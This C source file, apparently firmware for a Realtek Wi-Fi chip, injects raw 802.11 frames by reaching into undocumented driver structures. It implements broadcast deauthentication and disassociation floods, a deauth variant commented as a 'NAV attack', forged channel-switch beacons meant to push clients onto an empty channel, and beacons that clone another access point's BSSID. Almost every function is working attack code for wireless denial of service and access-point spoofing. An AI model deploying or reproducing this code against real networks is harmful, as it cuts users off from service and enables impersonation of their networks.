#include "packet-injection.h"

/*
 * Transmits a raw 802.11 frame with a given length.
 * The frame must be valid and have a sequence number of 0 as it will be set automatically.
 * The frame check sequence is added automatically and must not be included in the length.
 * @param frame A pointer to the raw frame
 * @param size The size of the frame
*/
void wifi_tx_raw_frame(void* frame, size_t length) {
  uint8_t *ptr = (uint8_t *)**(uint32_t **)(rltk_wlan_info + 0x10);
  uint8_t *frame_control = (uint8_t *)alloc_mgtxmitframe(ptr + 0xa80);

  if (frame_control != 0) {
    update_mgntframe_attrib(ptr, frame_control + 8);
    memset((void *)*(uint32_t *)(frame_control + 0x80), 0, 0x68);
    uint8_t *frame_data = (uint8_t *)*(uint32_t *)(frame_control + 0x80) + 0x28;
    memcpy(frame_data, frame, length);
    *(uint32_t *)(frame_control + 0x14) = length;
    *(uint32_t *)(frame_control + 0x18) = length;
    dump_mgntframe(ptr, frame_control);
  }
}

/*
 * Transmits a 802.11 deauth frame on the active channel
 * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
 * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the deauth
 * @param reason A reason code according to the 802.11 spec. Optional 
*/
void wifi_tx_deauth_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  if (src_mac == nullptr || dst_mac == nullptr) return;
  DeauthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

void wifi_tx_deauth_nav(void* src_mac, void* dst_mac, uint16_t reason) {
  if (src_mac == nullptr || dst_mac == nullptr) return;
  DeauthFrame frame;
  frame.duration = 0xFFFF; // Force NAV attack duration
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
}

void wifi_tx_disassoc_frame(void* src_mac, void* dst_mac, uint16_t reason) {
  if (src_mac == nullptr || dst_mac == nullptr) return;
  DisassocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.reason = reason;
  wifi_tx_raw_frame(&frame, sizeof(DisassocFrame));
}

/*
 * Transmits a very basic 802.11 beacon with the given ssid on the active channel
 * @param src_mac An array of bytes containing the mac address of the sender. The array has to be 6 bytes in size
 * @param dst_mac An array of bytes containing the destination mac address or FF:FF:FF:FF:FF:FF to broadcast the beacon
 * @param ssid '\0' terminated array of characters representing the SSID
*/
void wifi_tx_beacon_frame(void* src_mac, void* dst_mac, const char *ssid) {
  BeaconFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  for (int i = 0; ssid[i] != '\0'; i++) {
    frame.ssid[i] = ssid[i];
    frame.ssid_length++;
  }
  wifi_tx_raw_frame(&frame, 38 + frame.ssid_length);
}

void wifi_tx_auth_frame(void* src_mac, void* dst_mac) {
  AuthFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, dst_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  wifi_tx_raw_frame(&frame, sizeof(AuthFrame));
}

void wifi_tx_assoc_frame(void* src_mac, void* dst_mac) {
  AssocFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, dst_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  wifi_tx_raw_frame(&frame, sizeof(AssocFrame));
}

void wifi_tx_null_frame(void* src_mac, void* dst_mac) {
  NullFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, dst_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  wifi_tx_raw_frame(&frame, sizeof(NullFrame));
}

void wifi_tx_probe_frame(void* src_mac, void* dst_mac) {
  if (src_mac == nullptr || dst_mac == nullptr) return;
  ProbeRequest frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, dst_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  wifi_tx_raw_frame(&frame, sizeof(ProbeRequest));
}

void wifi_tx_csa_frame(void* src_mac, void* dst_mac, uint8_t target_channel) {
  if (src_mac == nullptr || dst_mac == nullptr) return;
  CSAFrame frame;
  memcpy(&frame.source, src_mac, 6);
  memcpy(&frame.access_point, src_mac, 6);
  memcpy(&frame.destination, dst_mac, 6);
  frame.new_channel = target_channel; // Force client to this (empty) channel
  wifi_tx_raw_frame(&frame, sizeof(CSAFrame));
}

void wifi_tx_raw_beacon(void* src_mac, void* dst_mac, uint8_t* payload, size_t payload_len, uint16_t interval, uint16_t caps) {
  if (src_mac == nullptr || dst_mac == nullptr || payload == nullptr || payload_len == 0 || payload_len > 400) return;
  
  // 802.11 Beacon Header (24 bytes MAC header + 12 bytes beacon fixed params = 36 bytes)
  uint8_t frame[512]; 
  memset(frame, 0, 36);
  
  frame[0] = 0x80; // Type: Management, Subtype: Beacon
  memcpy(&frame[4], dst_mac, 6);   // Destination (broadcast)
  memcpy(&frame[10], src_mac, 6);  // Source (cloned BSSID)
  memcpy(&frame[16], src_mac, 6);  // BSSID
  
  // BUG FIX: Timestamp (offset 24, 8 bytes) - must be non-zero for clients to accept
  // Use micros() to simulate a running TSF counter
  uint64_t tsf = (uint64_t)micros();
  memcpy(&frame[24], &tsf, 8);
  
  // Beacon Interval (offset 32, 2 bytes)
  memcpy(&frame[32], &interval, 2);
  // Capability Info (offset 34, 2 bytes)
  memcpy(&frame[34], &caps, 2);
  
  // Append Information Elements (Tags: SSID, Rates, Channel, etc.)
  memcpy(&frame[36], payload, payload_len);
  
  wifi_tx_raw_frame(frame, 36 + payload_len);
}

void wifi_tx_beacon_csa_frame(void* src_mac, void* dst_mac, const char *ssid, uint8_t target_channel) {
  if (src_mac == nullptr || dst_mac == nullptr || ssid == nullptr) return;
  
  uint8_t frame[512]; 
  memset(frame, 0, 36);
  
  frame[0] = 0x80; // Type: Management, Subtype: Beacon
  memcpy(&frame[4], dst_mac, 6);   // Destination (broadcast)
  memcpy(&frame[10], src_mac, 6);  // Source
  memcpy(&frame[16], src_mac, 6);  // BSSID
  
  // Timestamp
  uint64_t tsf = (uint64_t)micros();
  memcpy(&frame[24], &tsf, 8);
  
  // Beacon Interval
  uint16_t interval = 0x64;
  memcpy(&frame[32], &interval, 2);
  
  // Capability Info (Privacy, Short Preamble, etc.)
  uint16_t caps = 0x0411; 
  memcpy(&frame[34], &caps, 2);

  int offset = 36;
  
  // Tag 0: SSID
  frame[offset++] = 0; // Tag Number
  int ssid_len = strlen(ssid);
  frame[offset++] = ssid_len; // Tag Length
  memcpy(&frame[offset], ssid, ssid_len);
  offset += ssid_len;
  
  // Tag 1: Supported Rates
  frame[offset++] = 1;
  frame[offset++] = 8;
  const uint8_t rates[] = {0x8C, 0x12, 0x98, 0x24, 0xB0, 0x48, 0x60, 0x6C};
  memcpy(&frame[offset], rates, 8);
  offset += 8;

  // Tag 3: DS Parameter Set
  frame[offset++] = 3;
  frame[offset++] = 1;
  frame[offset++] = target_channel; // Current channel (can be fake)
  
  // Tag 37: Channel Switch Announcement (CSA)
  frame[offset++] = 37;
  frame[offset++] = 3; // Length
  frame[offset++] = 1; // Switch Mode (1 = stop transmitting until switch)
  frame[offset++] = target_channel; // New Channel
  frame[offset++] = 1; // Switch Count (switch after 1 beacon)
  
  // Tag 60: Extended Channel Switch Announcement (ECSA) - for 5GHz wide bands
  frame[offset++] = 60;
  frame[offset++] = 3; // Length
  frame[offset++] = 1; // Switch Mode
  frame[offset++] = 115; // New Operating Class (115 is common for 5GHz)
  frame[offset++] = target_channel; // New Channel

  wifi_tx_raw_frame(frame, offset);
}

